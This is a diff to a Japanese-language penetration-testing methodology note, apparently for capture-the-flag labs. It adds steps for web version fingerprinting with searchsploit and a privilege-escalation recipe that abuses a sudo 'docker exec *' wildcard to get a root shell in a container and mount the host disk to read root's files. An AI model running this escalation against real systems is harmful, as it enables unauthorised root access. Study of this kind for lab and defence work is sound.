@@ -39,11 +39,17 @@
 
 ### Webサービス（80/443）が開いている場合
 1. ブラウザでトップページを確認 → 使用技術・フレームワーク・エンドポイントの把握
-2. gobuster / ffuf でディレクトリ列挙
-3. **エンドポイントのIDやパラメータに連番・予測可能な値がないか確認** → IDOR の可能性
-4. vhost（仮想ホスト）のファジングを検討
+2. **Webアプリのバージョンを特定する（最優先）**
+   - ヘッダー・フッター・ログインページ・`/api/health` 等にバージョンが表示されていないか確認
+   - 判明したら即 `searchsploit [アプリ名] [バージョン]` で既知脆弱性を検索
+   - CVE が見つかった場合、パストラバーサル / RCE 等の深刻な脆弱性が優先
+3. gobuster / ffuf でディレクトリ列挙
+4. **エンドポイントのIDやパラメータに連番・予測可能な値がないか確認** → IDOR の可能性
+5. vhost（仮想ホスト）のファジングを検討
 
 → 詳細: `../01_Reconnaissance/Web_Enumeration.md`
+→ CVE 検索: `../05_Tools_Reference/Searchsploit.md`
+→ パストラバーサル: `../02_Initial_Access/Web_Vulnerabilities/Path_Traversal.md`
 
 ### FTPが開いている場合
 - 匿名ログインを試行 (`ftp anonymous@`)
@@ -114,3 +120,19 @@ GTFOBins で確認。標準バイナリ（find, vim, python等）に SUID が設
 ### sudo -l で特定コマンドが許可されている場合
 
 → 詳細: `../03_Post_Access_Linux/Sudo_Misconfig.md`
+
+**docker exec にワイルドカードが許可されている場合（重要）:**
+
+```bash
+# sudo -l で以下が出た場合
+# (root) NOPASSWD: /snap/bin/docker exec *
+
+# コンテナ内で root として実行できる
+sudo /snap/bin/docker exec --user root [CONTAINER_ID] id
+
+# ブロックデバイスが見える場合はホスト全体にアクセス可能
+sudo /snap/bin/docker exec --user root [CONTAINER_ID] \
+  sh -c 'mkdir -p /mnt/host && mount /dev/sda1 /mnt/host && cat /mnt/host/root/root.txt'
+```
+
+→ 詳細: `../03_Post_Access_Linux/Sudo_Misconfig.md`（パターン4）
